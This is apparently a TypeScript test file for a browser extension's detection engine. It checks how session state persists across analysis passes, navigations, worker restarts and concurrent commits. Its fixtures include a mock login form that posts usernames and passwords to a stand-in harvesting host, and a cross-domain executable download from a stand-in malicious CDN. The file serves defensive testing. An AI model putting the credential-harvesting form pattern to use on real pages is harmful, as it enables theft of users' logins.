/**
 * DEC-43 Option 1 — multi-pass session persistence, end to end through the
 * PRODUCTION composition (SessionStore + DocumentIndex + runPassInSession + the
 * real engine), not the engine-level unit test. Four cases, matching the Step 2
 * test plan:
 *   1. Live multi-pass firing: pass 1 produces a primary finding -> a later
 *      pass in the SAME session sees anyPriorPrimaryFindingActive and DL-01
 *      genuinely fires.
 *   2. Boundary reset: a new navigation = a new session = no prior finding =
 *      DL-01 does not fire (§11.4).
 *   3. Late-message attribution: a message carrying an earlier document's id
 *      resolves to THAT document's session, not whatever navigation is current
 *      — including after a worker restart (index rebuilt from persisted records).
 *   4. Concurrency: two overlapping commits on one session key lose no update.
 *
 * The fake backend JSON-round-trips on set, mirroring chrome.storage.session's
 * serialize-through and proving the record survives it.
 *
 * DOCUMENTID IDENTITY NOTE. The whole attribution design rests on
 * webNavigation.onCommitted's `details.documentId` being the SAME string the
 * browser later attaches to a content-script message as `sender.documentId`.
 * That is a browser guarantee that cannot be exercised under node; here the id
 * recorded at startSession (mirroring onCommitted) is the id used to resolve
 * (mirroring sender.documentId), and it round-trips through storage. The live
 * SW logs any unresolved documentId (service-worker.ts resolveSessionParts) so a
 * real-browser identity break would surface at runtime rather than silently.
 *
 * Run: node --experimental-strip-types apps/extension/multi-pass-session.test.ts
 */

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';

import {
  SessionStore, type SessionStorageBackend, type SessionKeyParts,
} from './session-store.ts';
import { DocumentIndex, runPassInSession } from './session-pass.ts';
import {
  collectUrl, collectDomainRepresentation, collectTransport,
  collectLoginInterface, collectScriptRuntime,
} from './collect-evidence.ts';
import { assembleEvidence } from './assemble-evidence.ts';
import { computeDownloadContextEvidence, type DownloadRecord } from './download-context.ts';
import { recordCommittedPass, recordIntervention } from '../../packages/engine/stage7-8.ts';
import type { ScoringEntry } from '../../packages/contracts/passresult.contract.v1.ts';
import type { RuleSet } from '../../packages/contracts/ruleset.format.v1.ts';
import type { AuthStoreReader } from '../../packages/contracts/boundary.interfaces.v1.ts';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const ruleSet = JSON.parse(readFileSync(join(REPO, 'rulesets', 'rules-v0.1.0.json'), 'utf8')) as RuleSet;
// No fingerprint is ever collected here, so authContext is unevaluable before a
// lookup — a throwing reader proves the store is never consulted.
const forbiddenStore: AuthStoreReader = {
  lookup: async () => { throw new Error('store must not be consulted'); },
};

/** In-memory backend that JSON-round-trips on set (mirrors chrome.storage.session)
 *  and, optionally, yields between get and set to widen the concurrency window. */
function memoryBackend(delayInSet = false): SessionStorageBackend {
  const m = new Map<string, unknown>();
  return {
    async get(keys) {
      if (keys === null) return Object.fromEntries(m);
      const arr = Array.isArray(keys) ? keys : [keys];
      const out: Record<string, unknown> = {};
      for (const k of arr) if (m.has(k)) out[k] = m.get(k);
      return out;
    },
    async set(items) {
      if (delayInSet) await new Promise((r) => setTimeout(r, 0));
      for (const [k, v] of Object.entries(items)) m.set(k, JSON.parse(JSON.stringify(v)));
    },
    async remove(keys) {
      const arr = Array.isArray(keys) ? keys : [keys];
      for (const k of arr) m.delete(k);
    },
  };
}

// ── evidence builders (the real extension collectors + assembler) ───────────

const LOGIN_HTML = `<!doctype html><html><body>
  <form method="POST" action="https://evil-collect.example/harvest">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
    <button type="submit">Sign in</button>
  </form></body></html>`;

/** A valid off-origin login page — fires CRED-01 (a primary rule). */
function loginPageEvidence() {
  const pageUrl = 'https://accounts.example.com/login';
  const dom = new JSDOM(LOGIN_HTML, { url: pageUrl });
  const parts = {
    url: collectUrl(pageUrl),
    domainRepresentation: collectDomainRepresentation(pageUrl),
    transport: collectTransport(new URL(pageUrl).protocol),
    loginInterface: collectLoginInterface(dom.window.document as unknown as ParentNode, dom.window.document.baseURI),
    scriptRuntime: collectScriptRuntime({ transmissionEndpoints: [], dynamicScriptOrigins: [] }),
  };
  return assembleEvidence(parts, pageUrl, '2026-09-03');
}

/** A page carrying a cross-domain executable download — DL-01's first three
 *  conjuncts match; only priorFindingActive decides whether it fires. */
function downloadEvidence() {
  const pageUrl = 'https://shop.example.com/checkout';
  const dom = new JSDOM('<!doctype html><html><body><p>checkout</p></body></html>', { url: pageUrl });
  const rec: DownloadRecord = {
    url: 'https://cdn.evil.tld/installer.exe', filename: 'installer.exe',
    mime: 'application/x-msdownload', referrer: 'https://shop.example.com/checkout', observedAt: 1,
  };
  const parts = {
    url: collectUrl(pageUrl),
    domainRepresentation: collectDomainRepresentation(pageUrl),
    transport: collectTransport(new URL(pageUrl).protocol),
    loginInterface: collectLoginInterface(dom.window.document as unknown as ParentNode, dom.window.document.baseURI),
    scriptRuntime: collectScriptRuntime({ transmissionEndpoints: [], dynamicScriptOrigins: [] }),
    downloadContext: computeDownloadContextEvidence(rec),
  };
  return assembleEvidence(parts, pageUrl, '2026-09-03');
}

const fired = (o: { findings: readonly { ruleId: string }[] }, id: string) => o.findings.some((f) => f.ruleId === id);

// ══ Case 1: live multi-pass firing ═════════════════════════════════════════
{
  const store = new SessionStore(memoryBackend());
  const docIndex = new DocumentIndex();
  const parts: SessionKeyParts = { tabId: 1, navigationId: 1000 };
  const docA = 'DOC-A-nav1000';
  await store.startSession(parts, 'https://accounts.example.com/login', '2026-09-03', docA);
  docIndex.record(docA, parts);

  // Pass 1 — the login page fires CRED-01 (primary), committed into the session.
  const p1 = await runPassInSession({ store, parts, evidence: loginPageEvidence(), ruleSet, storeReader: forbiddenStore });
  assert.ok(fired(p1, 'CRED-01'), `pass 1 must fire CRED-01; fired [${p1.findings.map((f) => f.ruleId).join(', ')}]`);
  const afterP1 = await store.getSession(parts);
  assert.equal(afterP1?.priorPassState?.anyPriorPrimaryFindingActive, true,
    'recordCommittedPass must set the flag after a committed primary finding');

  // Pass 2 — a cross-domain executable download in the SAME session. DL-01 fires.
  const p2 = await runPassInSession({ store, parts, evidence: downloadEvidence(), ruleSet, storeReader: forbiddenStore });
  assert.ok(fired(p2, 'DL-01'),
    `DL-01 must FIRE on pass 2 through the live session path; fired [${p2.findings.map((f) => f.ruleId).join(', ')}]`);
  console.log('  [1] live multi-pass: pass1 CRED-01 -> session flag true -> pass2 DL-01 FIRES ✓');
}

// ══ Case 2: session boundary reset (new navigation) ════════════════════════
{
  const store = new SessionStore(memoryBackend());
  const docIndex = new DocumentIndex();
  // Navigation 1 fires a primary finding, as in case 1.
  const nav1: SessionKeyParts = { tabId: 2, navigationId: 100 };
  await store.startSession(nav1, 'https://accounts.example.com/login', '2026-09-03', 'DOC-nav1');
  docIndex.record('DOC-nav1', nav1);
  await runPassInSession({ store, parts: nav1, evidence: loginPageEvidence(), ruleSet, storeReader: forbiddenStore });

  // A NEW navigation on the same tab = a NEW session, priorPassState null.
  const nav2: SessionKeyParts = { tabId: 2, navigationId: 200 };
  await store.startSession(nav2, 'https://shop.example.com/checkout', '2026-09-03', 'DOC-nav2');
  docIndex.record('DOC-nav2', nav2);
  const fresh = await store.getSession(nav2);
  assert.equal(fresh?.priorPassState, null, 'a new navigation starts with priorPassState null');

  const p = await runPassInSession({ store, parts: nav2, evidence: downloadEvidence(), ruleSet, storeReader: forbiddenStore });
  assert.ok(!fired(p, 'DL-01'),
    'DL-01 must NOT fire in a new navigation — the prior navigation\'s finding does not carry over (§11.4)');
  console.log('  [2] boundary reset: prior finding in nav1 does NOT leak into nav2; DL-01 silent ✓');
}

// ══ Case 3: late-message attribution (incl. after worker restart) ══════════
{
  const backend = memoryBackend();
  const store = new SessionStore(backend);
  const docIndex = new DocumentIndex();
  const navA: SessionKeyParts = { tabId: 3, navigationId: 10 };
  const navB: SessionKeyParts = { tabId: 3, navigationId: 20 };
  await store.startSession(navA, 'https://a.example/', '2026-09-03', 'DOC-A');
  docIndex.record('DOC-A', navA);
  // Page A committed a primary finding.
  await runPassInSession({ store, parts: navA, evidence: loginPageEvidence(), ruleSet, storeReader: forbiddenStore });
  // Then the tab navigated to B — B is now the "current" navigation on tab 3.
  await store.startSession(navB, 'https://b.example/', '2026-09-03', 'DOC-B');
  docIndex.record('DOC-B', navB);

  // A LATE evidence message from page A arrives (sender.documentId === 'DOC-A').
  // It must resolve to A's session, not B's, even though B is current.
  assert.deepEqual(docIndex.resolve('DOC-A'), navA, 'late message with DOC-A must resolve to nav A, not the current nav B');
  assert.deepEqual(docIndex.resolve('DOC-B'), navB);

  // And after a worker restart (cold, empty index) the attribution survives,
  // because documentId is persisted on the record and rebuilt from storage.
  const coldIndex = new DocumentIndex();
  coldIndex.rebuildFrom(await store.reconstructAll());
  assert.deepEqual(coldIndex.resolve('DOC-A'), navA, 'documentId attribution survives worker restart (rebuilt from records)');
  assert.deepEqual(coldIndex.resolve('DOC-B'), navB);

  // Running the late A-message's pass commits to A's session — B stays clean.
  const pA = await runPassInSession({ store, parts: coldIndex.resolve('DOC-A')!, evidence: downloadEvidence(), ruleSet, storeReader: forbiddenStore });
  assert.ok(fired(pA, 'DL-01'), 'the late A-attributed pass sees A\'s prior finding -> DL-01 fires');
  const bRec = await store.getSession(navB);
  assert.equal(bRec?.priorPassState?.anyPriorPrimaryFindingActive ?? false, false, 'B\'s session was not touched by the A-attributed pass');
  console.log('  [3] late-message attribution: DOC-A resolves to nav A (not current nav B), survives restart ✓');
}

// ══ Case 4: concurrency — no lost update on one session key ════════════════
{
  const store = new SessionStore(memoryBackend(true)); // delay in set widens the race window
  const parts: SessionKeyParts = { tabId: 4, navigationId: 1 };
  await store.startSession(parts, 'https://x.example/', '2026-09-03', 'DOC-X');

  const primaryScoring: readonly ScoringEntry[] = [{
    findingId: 'f' as ScoringEntry['findingId'], ruleId: 'CRED-06' as ScoringEntry['ruleId'],
    ruleType: 'primary', parentRuleId: null, baseWeight: 40, suppressionsApplied: [],
    maxReduction: 0, effectiveWeight: 40, subsumed: false, parentQualified: null, countedInScore: true,
  }];

  // Two commits fired concurrently, touching DIFFERENT fields of priorPassState:
  // one records an intervention (High), the other a committed primary finding.
  // A lost update would drop one. The per-key lock serializes them, so BOTH land.
  await Promise.all([
    store.recordPassOutcome(parts, (p) => recordIntervention(p, 'High')),
    store.recordPassOutcome(parts, (p) => recordCommittedPass(p, primaryScoring)),
  ]);

  const rec = await store.getSession(parts);
  assert.equal(rec?.priorPassState?.highestInterventionTier, 'High', 'concurrency: the intervention update was not lost');
  assert.equal(rec?.priorPassState?.anyPriorPrimaryFindingActive, true, 'concurrency: the committed-finding update was not lost');
  assert.equal(rec?.priorPassState?.interventionPresented, true);
  console.log('  [4] concurrency: two overlapping commits on one key both land, no lost update ✓');
}

console.log('all multi-pass session assertions passed');
